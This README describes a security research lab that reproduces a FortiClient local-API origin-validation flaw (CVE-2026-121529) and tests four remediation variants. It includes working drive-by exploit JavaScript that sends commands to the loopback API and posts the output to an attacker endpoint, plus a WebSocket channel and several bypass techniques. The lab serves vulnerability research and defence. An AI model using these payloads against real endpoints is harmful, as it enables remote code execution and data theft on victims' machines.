# CVE-2026-121529 — FortiClient local API origin validation error (drive-by RCE)

| | |
|---|---|
| **CVE** | CVE-2026-121529 |
| **Component** | FortiClient / FortiClient Windows PAM / FortiClient Mac — local API endpoint (`127.0.0.1:9191`) |
| **Affected** | Windows & Windows PAM `7.4.0`–`7.4.7`, `7.2.0`–`7.2.14`; Mac `7.4.0`–`7.4.7` |
| **Fixed in** | `7.4.8` (7.4 branch), `7.2.15` (7.2 branch) |
| **CWE** | CWE-346 (Origin Validation Error) |
| **Impact** | Unauthenticated remote code execution as the FortiClient service account (`SYSTEM` on Windows) |
| **Vector** | A web page the victim visits; the victim's own browser drives the privileged local API |
| **Trigger** | The `Origin` header of a cross-origin request — or its absence |

Fortinet's advisory (FG-IR-26-194, published 2026-11-10) describes the flaw as an
*origin validation error* in the local API of FortiClient, FortiClient Windows PAM and
FortiClient Mac that "may allow an unauthorized remote attacker to execute unauthorized
code or commands" and requires interaction with the victim.

The local API is the loopback interface used by the FortiPAM privileged-access components
on the same endpoint. It listens on `127.0.0.1:9191` and offers a privileged-session
operation that runs a command with the privileges of the service. Because the service
never validates the origin of the caller, a page on **any** web site can make the
victim's own browser drive that API: the browser sends the request, the API executes it,
and the browser hands the answer back to the attacker's script. The victim only has to
visit a page.

This repository contains a containerised laboratory that reproduces the flaw with a real
browser, the differential against three remediation shapes, and the results of a
0-day sweep against the patched model. The sweep produces three findings that matter
for any product of this shape: a CORS-header-only remediation does not stop the attack
at all, because a browser applies no CORS policy to a WebSocket handshake; an
origin-validated remediation that accepts a request without an `Origin` header is
bypassed by a cross-origin `<img>`; and a blind execution can be confirmed through an
image side channel.

---

## 1. Scope and fidelity of this laboratory

FortiClient is proprietary software. None of its code, binaries or configuration are
redistributed here, and the vendor does not publish the local API's endpoint list or its
origin-validation code. What is reproducible here is therefore:

* **the vendor's own statement of the defect** — CWE-346, local API endpoint, unauthenticated,
  victim interaction required, CVSS 9.1, and the affected/fixed version matrix — taken
  verbatim from FG-IR-26-194;
* **the security-relevant behaviour of the local API** — a loopback HTTP listener on
  `127.0.0.1:9191`, a privileged-session operation that executes a command with the
  service's privileges, a WebSocket variant of that operation, and an
  origin-validation layer;
* **the browser-side semantics** that turn the origin-validation error into code
  execution. These are properties of the browser and of the HTTP/CORS protocol, not of
  FortiClient, and they are exercised with a real Chromium instance.

Everything the laboratory asserts about the *vendor product* is sourced from the
advisory; everything it asserts about the *model* is labelled as such. The model is the
only thing that runs in the lab, and it is deliberately built so that the vulnerable and
the patched behaviour differ in the origin-validation layer alone.

The model lives in `lab/forticlient_api.py` and is selected with `FCT_MODE`:

| `FCT_MODE` | behaviour | version reported |
|---|---|---|
| `vuln` | no origin validation at all — the request `Origin` is reflected into `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true` | 7.4.7 |
| `fixed-cors` | remediation that only tightens the CORS headers; the request is still processed, and the WebSocket surface is not covered by CORS at all | 7.4.8 |
| `fixed-origin-only` | remediation that validates the origin server-side but still accepts a request that carries no `Origin` header | 7.4.8 |
| `fixed-strict` | remediation that validates the origin server-side **and** requires a shared secret header that a cross-origin request cannot set without a preflight | 7.4.8 |

---

## 2. Root cause

The browser — not the server — decides whether a page may read the answer of a
cross-origin request. The server expresses that decision in the CORS response headers:
`Access-Control-Allow-Origin` names the single origin that is allowed to read the
response, and `Access-Control-Allow-Credentials: true` additionally allows the request
to carry cookies and other credentials.

A local API that reflects the request's own `Origin` back into that header, and pairs it
with `Access-Control-Allow-Credentials: true`, hands every page on the internet a valid
cross-origin channel into a privileged local service. The origin is never validated, and
CWE-346 is exactly that: the server trusts the value it is supposed to check.

The vulnerable model does this in `_send()`:

```python
origin = cors_origin if cors_origin is not None else self.headers.get("Origin")
if cors_allowed(origin) and origin:
    # The vulnerable build echoes ANY origin and allows credentials.
    self.send_header("Access-Control-Allow-Origin", origin)     # <-- any origin
    self.send_header("Access-Control-Allow-Credentials", "true")
```

and `cors_allowed()` in the `vuln` mode returns `True` for every input:

```python
def cors_allowed(origin):
    if MODE == "vuln":
        # 7.4.7 model: the service trusts whatever origin asks.
        return True
```

The preflight is equally permissive, and it reflects the requested headers as well:

```python
def do_OPTIONS(self):
    ...
    extra = {
        "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers": self.headers.get(
            "Access-Control-Request-Headers", "Content-Type, Authorization"),
        "Access-Control-Max-Age": "86400",
    }
```

The privileged operation itself performs no authorization at all — in the `vuln` mode
`action_allowed()` returns `True` unconditionally — so the request that arrives with a
forged or absent origin is executed with the privileges of the service:

```python
def action_allowed(headers):
    if MODE in ("vuln", "fixed-cors"):
        return True
```

### The patched shape

A remediation has to decide *on the server* whether the caller is a trusted local
component. The `fixed-strict` model does that before the action is performed:

```python
def action_allowed(headers):
    ...
    origin = headers.get("Origin")
    token  = headers.get(TOKEN_HEADER)
    if token != TOKEN:
        return False
    if origin is None:
        return True          # the native local agent sends no Origin
    return origin in ALLOWED_ORIGINS
```

The order matters: the check happens **before** the command runs, so an untrusted
request never reaches the sink.

---

## 3. Attack surface

```
 attacker web page                       victim's workstation
 ─────────────────                       ──────────────────────
 https://evil.example
      │  1. victim visits the page
      ▼
 ┌────────────────────────┐            ┌──────────────────────────────────┐
 │ <script>               │            │ FortiClient local API            │
 │  fetch(                │  2.        │ 127.0.0.1:9191                   │
 │   'http://127.0.0.1:   │──────────▶ │  POST /api/v1/privileged/session │
 │    9191/api/v1/         │  preflight │   {"command": "..."}             │
 │    privileged/session') │  + POST   │                                  │
 │                        │◀────────── │  3. executes the command as      │
 │  3. reads the response │  200 OK    │     the service account          │
 │  4. POSTs it to        │            │                                  │
 │     evil.example/report│            └──────────────────────────────────┘
 └────────────────────────┘
```

Four request shapes reach the API from a page, and the laboratory exercises all of them:

| channel | shape | `Origin` sent? | preflight? | CORS applies? |
|---|---|---|---|---|
| `json` | `POST` with `Content-Type: application/json` | yes | yes | yes |
| `simple` | `POST` with `Content-Type: text/plain` (a CORS *simple request*) | yes | no | yes |
| `legacy-no-cors` | `POST` to an endpoint that never emits CORS headers | yes | no | yes |
| `img-csrf` | cross-origin `<img>` GET | **no** | no | yes (response only) |
| `websocket` | `WebSocket` to `ws://127.0.0.1:9191/ws` | yes | **no handshake at all** | **no — CORS does not exist for WebSockets** |
| `confirm-oracle` | cross-origin `<img>` GET of an artefact the executed command wrote | **no** | no | yes (response only) |

The last four matter.

* The CORS protocol protects the *response*, not the *request*: a browser delivers a
  simple request and an `<img>` GET to the local API regardless of what the API later
  says about origins, and the API acts on them. Only the *reading* of the answer is
  blocked.
* A **WebSocket is outside the CORS protocol entirely** — there is no preflight, and
  the frames exchanged after the handshake are not governed by the
  `Access-Control-*` machinery. A local API that exposes one is unaffected by any
  tightening of the CORS headers, and the page reads the answer in full.
* The **confirmation oracle** turns a blind RCE into a confirmed one: the executed
  command drops a 1×1 PNG into the artefact store, the page loads it as an image, and
  the image decodes only if the command really ran.

---

## 4. Reproduction environment

Podman network `cve121529lab`; every container is bounded (`--cpus 2 --memory 4g`).

| container | role |
|---|---|
| `forticlient-vuln` | the FortiClient 7.4.7 model — loopback API on `127.0.0.1:9191`, `FCT_MODE=vuln` |
| `forticlient-fixed-cors` | CORS-header-only remediation, `FCT_MODE=fixed-cors` |
| `forticlient-fixed-origin-only` | server-side origin validation that still accepts a missing `Origin`, `FCT_MODE=fixed-origin-only` |
| `forticlient-fixed-strict` | server-side origin validation plus shared secret, `FCT_MODE=fixed-strict` |
| `attacker-site` | the malicious web site, on `http://attacker-site:8080` (and `:9191` for the rebinding test) |

All four endpoint models run **the same image** and differ only in `FCT_MODE`; the code
path, the configuration and the entrypoint are identical.

Two details make the reproduction faithful rather than merely plausible:

* **The browser shares the endpoint's network namespace.** The PoC container is started
  with `--network container:forticlient-vuln`, so `http://127.0.0.1:9191` inside the
  browser is the very same loopback the local API listens on — as on a victim
  workstation. The API binds to `127.0.0.1` only, and it is provably unreachable from
  the other containers.
* **A real browser is used.** The flaw is enforced, or not enforced, by the browser's
  CORS implementation. A scripted HTTP client cannot demonstrate it, so the PoC drives
  headless Chromium through Playwright and observes what the *page* is allowed to read.

Nothing runs on the host: no listener, no browser, no FortiClient component. The
command output, the API request log and the attacker's exfiltration log are written to
a shared `results/` volume.

---

## 5. Running the environment

```
make prepare          # build the two images
make up               # create the network and start the four models + the attacker site
make check-vuln       # classification against the vulnerable model   (exit 1 = vulnerable)
make check-fixed      # classification against the patched model       (exit 0 = safe)
make differential     # the four models side by side
make exploit-vuln     # the full chain, with the command output and the exfiltrated data
make mitigation       # the CORS-header-only remediation
make ws               # the WebSocket surface
make probe            # origin-validation bypass matrix
make rebind           # DNS-rebinding style attack
make raw              # raw-socket HTTP probes
make 0day             # the full sweep
make evidence         # capture everything into evidence/
make down             # tear down
```

`run-lab.sh` exposes the same targets (`./run-lab.sh up|check|exploit|mitigation|ws|probe|rebind|raw|0day|differential|evidence|down`).

---

## 6. The PoC

`poc/poc.py` runs inside the PoC image and drives headless Chromium.

| mode | what it does |
|---|---|
| `check` | classification: does the page drive the API, and can the page read the answer? |
| `exploit` | the full chain, with the on-disk proof of execution and the exfiltrated data |
| `mitigation` | the same attack against a CORS-header-only remediation |
| `probe` | the origin-validation bypass matrix (two passes, see §8) |
| `rebind` | the DNS-rebinding shape, where the page origin *is* the API origin |
| `raw` | hand-crafted HTTP requests that no browser would produce |
| `0day` | the full sweep |

Exit codes:

| code | meaning |
|---|---|
| `0` | safe — the API did not execute anything |
| `1` | vulnerable — the page drove the API and read the answer |
| `2` | target unreachable |
| `3` | the primitive is confirmed (the command ran) but the gadget is blocked (the answer was not readable) |

The malicious page is served by `lab/attacker_server.py` and is a normal web page; its
JavaScript is the attack:

```js
await fetch(target, {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ command: cmd })
});
```

The command is executed by the local API with the service's privileges, and the answer is
posted back to the attacker's own server:

```js
await fetch(report, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(out)
});
```

The same page also opens a WebSocket, which no CORS policy governs:

```js
const sock = new WebSocket('ws://127.0.0.1:9191/ws');
sock.onopen = () => sock.send(JSON.stringify({ command: cmd }));
sock.onmessage = (ev) => { /* the full answer, stdout included */ };
```

A reproduction path:

| path | vulnerable model | patched model (`fixed-strict`) |
|---|---|---|
| `POST` + `application/json` (preflight) | 200, body readable | 403, `Failed to fetch` |
| `POST` + `text/plain` (simple request) | 200, body readable | 403, `Failed to fetch` |
| `POST` to the no-CORS endpoint | 200, body **not** readable | 403, `Failed to fetch` |
| `<img>` GET (no `Origin` header) | 200, command executed | 403, command not executed |
| WebSocket `ws://127.0.0.1:9191/ws` | 101, command executed, answer readable | 403, no upgrade |
| confirmation image (artefact store) | image decoded → execution confirmed | 403 → not confirmed |
| command output on the endpoint | `uid=0(root)` | *(nothing written)* |
| data exfiltrated to the attacker | yes | no |

---

## 7. Expected results

| model | executed | response readable | `<img>` CSRF | WebSocket | confirmed | PoC exit | verdict |
|---|---|---|---|---|---|---|---|
| `vuln` — FortiClient 7.4.7 model | **yes** | **yes** | **yes** | **yes** | **yes** | 1 | **VULNERABLE** — drive-by RCE with data exfiltration |
| `fixed-cors` — CORS-header-only remediation | **yes** | **yes** | **yes** | **yes** | **yes** | 1 | **VULNERABLE** — the WebSocket surface is untouched by CORS |
| `fixed-origin-only` — origin validated, missing `Origin` accepted | **yes** | no | **yes** | no | **yes** | 3 | primitive confirmed — the RCE survives through `<img>` |
| `fixed-strict` — origin validated + shared secret | no | no | no | no | no | 0 | **SAFE** |

The three controls are what make this a proof rather than an anecdote: the same
browser, the same page, the same command and the same network, against four
origin-validation behaviours that differ in one place.

Observed output of the vulnerable model:

```
"channels_executed": ["json", "legacy-no-cors", "query", "simple", "websocket"],
"confirmed": true,
"executed": true,
"exfiltrated": true,
"img_csrf_executed": true,
"origins_seen": ["http://attacker-site:8080", "None"],
"readable": true,
"websocket_executed": true,
"websocket_readable": true,
"verdict": "VULNERABLE"
```

and of the command that the API ran on the endpoint:

```
uid=0(root)
gid=0(root)
PWNED
```

---

## 8. Environment preconditions

The flaw fires only when all of the following hold, and each of them is a deployment
decision rather than a property of the attacker:

* **The local API must be listening.** The privileged-access integration on
  `127.0.0.1:9191` has to be active on the endpoint; on a host without the FortiPAM
  components there is nothing to drive.
* **The victim has to visit the attacker's page** while FortiClient runs. The advisory
  states this explicitly: exploitation requires interaction with the victim. No
  background request from the attacker reaches the loopback.
* **The browser must not have blocked the request for another reason.** Recent Chromium
  versions gate *public → private* network requests behind a permission prompt (Local
  Network Access). Where that prompt is enforced, the drive-by is interrupted by the
  user; where it is not, the request goes straight through. The laboratory's Chromium
  build does not gate it, which is the conservative case for the attacker.
* **The privileged operation must not require a credential the page cannot set.** A
  custom request header forces a preflight, and the preflight is an opportunity for the
  server to refuse. This is what separates `fixed-strict` from `fixed-origin-only`.
* **The defence has to cover every transport.** A WebSocket endpoint on the same local
  API is not governed by CORS at all, so a fix that only narrows the CORS headers
  leaves it fully open — see §9.1.
* **The service account must be privileged.** On Windows the local API runs as
  `SYSTEM`, so the executed command inherits full system rights. In the laboratory the
  API runs as `uid 0` inside its container, which is the same shape.

---

## 9. Additional findings (0-day sweep on the patched line)

The sweep targets the patched model. Every item below was executed against it, and the
negative results are captured in `evidence/` as well.

### 9.1 A CORS-header-only remediation does not stop the execution — and does not stop the exfiltration either

The most likely shape of a hurried fix is to stop reflecting the origin while leaving
the request processing untouched. On the HTTP surface that closes the exfiltration and
leaves the code execution:

| channel | request executed | answer readable |
|---|---|---|
| `POST` + `application/json` | **yes** | no |
| `POST` + `text/plain` | **yes** | no |
| `<img>` GET | **yes** | no |
| **WebSocket** | **yes** | **yes** |

The last row is the decisive one. A browser applies **no CORS policy to a WebSocket
handshake**: there is no preflight, and the frames exchanged afterwards are not
governed by the `Access-Control-*` machinery at all. The page opened
`ws://127.0.0.1:9191/ws`, sent `{"command": "..."}` and read the complete answer —
stdout, exit code and proof identifier — with nothing to block it.

So against a CORS-header-only remediation the whole attack survives intact, and the
PoC classifies it as **VULNERABLE** (exit 1) rather than as a partially blocked
primitive. CORS-based origin validation is structurally incapable of protecting a
WebSocket surface; the remediation has to refuse the request **server-side, before the
action**, and it has to cover every transport, which is what `fixed-strict` does.

### 9.2 A blind RCE can be confirmed through an image side channel

The `<img>` and `simple` channels execute the command but hide the answer from the
page. The attacker does not have to stay blind: the executed command drops a 1×1 PNG
into the artefact store, the page then loads that file as an image, and the image
decodes **only if the command really ran**.

| model | executed | answer readable | execution confirmed by the page |
|---|---|---|---|
| `fixed-origin-only` | yes | no | **yes** |

The `confirm-oracle` column of the differential table is this check, and it turns the
partially blocked primitive of §9.3 below into a confirmed one: the attacker knows the
command ran, which is all that a drive-by RCE needs.

### 9.3 An origin-validated remediation that accepts a missing `Origin` is bypassed by `<img>`

A server-side origin check that reads

```python
if origin is not None and origin not in ALLOWED_ORIGINS:
    reject()
```

looks correct and is not. The native local agent does not send an `Origin` header, so
such a check has to let those requests through — and a browser does not send `Origin`
on cross-origin no-cors GET requests either. A cross-origin `<img>` pointing at the
privileged endpoint is therefore accepted and executed:

| model | `fetch()` channels (they carry an `Origin`) | `<img>` GET (no `Origin`) |
|---|---|---|
| `fixed-origin-only` | 403 — blocked | **200 — command executed** |

Measured on the patched model: the three `fetch()` channels return `403 origin not
allowed`, while the `<img>` request is executed with `origin: null` in the API log. The
attacker gets no output, but the command runs.

The WebSocket surface is *not* part of this bypass: a WebSocket handshake does carry an
`Origin` header, so an origin-validating server refuses the upgrade even though CORS
never applies to it. What bypasses it is the absence of the header, not the transport.

The remediation therefore has to distinguish "no `Origin` because it is a local agent"
from "no `Origin` because it is a browser request". A shared secret that a cross-origin
request cannot set without a preflight does that, and it is the only shape in this
laboratory that survived the sweep.

### 9.4 DNS rebinding

The attacker can serve the malicious page from the same host **and port** as the local
API and then resolve that name to `127.0.0.1`. The browser then treats the API call as
*same-origin* and applies no CORS check at all — the CORS layer is not even consulted.
The laboratory reproduces this shape by serving the page from `http://api.evil.test:9191`
and delivering the API request to the loopback instead.

Against the patched model the request is still refused (`403`, `origin not allowed`,
command not executed) because the origin is not allow-listed and the shared secret is
unknown. The negative result is recorded in `evidence/0day-dns-rebind.txt`.

The finding is that the rebinding shape removes CORS from the picture entirely: an
origin-based defence cannot see it, and only a credential the attacker does not have
stops it.

### 9.5 Origin-validator bypass matrix

Seventeen candidate origins were sent to the patched model, in two passes: without any
credential, and with the shared secret supplied so that the origin validator is tested
in isolation.

| candidate | pass 1 (no secret) | pass 2 (secret supplied) |
|---|---|---|
| allow-listed origin | blocked | accepted (baseline) |
| upper case | blocked | blocked |
| trailing dot | blocked | blocked |
| explicit default port `:443` | blocked | blocked |
| zero-padded port `:0443` | blocked | blocked |
| trailing whitespace | blocked | **accepted** |
| userinfo confusion `trusted@evil` | blocked | blocked |
| suffix confusion `trusted.evil` | blocked | blocked |
| prefix confusion `eviltrusted` | blocked | blocked |
| parent domain | blocked | blocked |
| browser-extension origin | blocked | accepted (allow-listed) |
| `null` origin | blocked | blocked |
| `null` + spoofed `Sec-Fetch-Site` | blocked | blocked |
| wildcard `*` | blocked | blocked |
| `http://127.0.0.1:9191` | blocked | blocked |
| `http://localhost:9191` | blocked | blocked |
| missing `Origin` header | blocked | **accepted** |

Two entries are accepted in the second pass and both are instructive:

* **trailing whitespace** — the header parser trims the value before the comparison,
  while the browser compares the untrimmed origin. The server therefore treats
  `https://fortipam.fortinet.com ` as trusted while the browser treats it as a foreign
  origin. The request is executed and the response is not readable: the same
  server/browser disagreement that produces §9.1, reached through a parser difference
  rather than through a missing header.
* **missing `Origin` header** — the local-agent case discussed in §9.2.

No candidate bypassed the origin validator in the sense of obtaining an *accepted and
readable* cross-origin channel to a trusted origin.

### 9.6 Raw HTTP probes

Nine hand-crafted requests that no browser would produce were sent to the patched model:
no `Origin` header, `Origin: null`, an allow-listed origin, an untrusted origin, a
duplicated `Origin` header, CRLF injection through the `Origin` value, a space-separated
origin list, `Host` header abuse and `X-Forwarded-Host` abuse.

All nine were refused by the patched model (`403`, nothing executed) and all nine were
executed by the vulnerable model. No header injection was observed: the response
contains no injected header, and the CRLF in the `Origin` value does not split the
response.

---

## 10. Mitigation

* Upgrade to FortiClient `7.4.8` (7.4 branch) or `7.2.15` (7.2 branch); FortiClient Mac
  `7.4.8`. The 8.0 branches and FortiClient Mac 7.2 are not affected.
* There is no virtual patch for FG-IR-26-194.
* Until the endpoint can be updated, reduce the exposure of the local API: keep the
  privileged-access integration disabled on endpoints that do not need it, and restrict
  the listener to `127.0.0.1`.
* Browser-side mitigation is not a substitute for the update: the request is delivered
  to the local API regardless of the CORS outcome.

---

## 11. Repository layout

```
README.md                  this write-up
GOAL.md                    objective, success criteria and status log
LICENSE                    MIT
CITATION.cff               citation metadata
SECURITY.md                security policy
Makefile                   convenience targets
run-lab.sh                 environment driver
lab/
  Containerfile            the target image (all four models + the attacker site)
  forticlient_api.py       the model of the FortiClient local API
  attacker_server.py       the malicious web site
poc/
  Containerfile            the PoC runner image (Playwright + Chromium)
  poc.py                   the browser-driven proof of concept
evidence/                  captured runs
results/                   live output of the lab (git-ignored)
```

---

## 12. References

* <https://www.fortiguard.com/psirt/FG-IR-26-194> — Fortinet PSIRT advisory FG-IR-26-194
* <https://www.cve.org/CVERecord?id=CVE-2026-121529> — CVE record
* <https://baldur.dk/research/> — Baldur Security research index (the reporter)
* <https://www.fortiguard.com/psirt/FG-IR-26-168> — FG-IR-26-168 / CVE-2026-84388,
  FortiPAM privileged-access Chrome extension, the adjacent surface in the same product
  family
* <https://www.cve.org/CVERecord?id=CVE-2025-59922> — CVE-2025-59922, FortiClient EMS
* <https://fetch.spec.whatwg.org/> — the Fetch standard: the `Origin` header and the
  CORS protocol
* <https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS> — CORS
* <https://developer.chrome.com/blog/private-network-access-update> — Chrome's
  private-network access gating of public → local requests

## Standalone exploit

`python3 exploit/exploit.py` runs the full chain (exit 1 exploited, 0 safe).
